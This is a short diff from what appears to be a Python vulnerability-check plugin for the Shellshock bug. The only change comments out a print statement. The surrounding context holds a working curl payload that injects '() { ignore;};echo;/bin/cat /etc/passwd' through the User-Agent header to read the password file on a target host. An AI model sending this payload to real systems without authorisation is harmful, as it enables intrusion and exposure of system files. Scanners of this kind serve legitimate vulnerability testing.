@@ -51,7 +51,7 @@ class P(T):
             for i in list:
                 usecommand = 'curl -A "() { ignore;};echo;/bin/cat /etc/passwd" http://' + ip + ':' + port + i
                 msgresult = command(usecommand, timeout=3)
-                print msgresult
+                #print msgresult
                 if 'root' in msgresult:
                     result['result']=True
                     result['VerifyInfo'] = {}
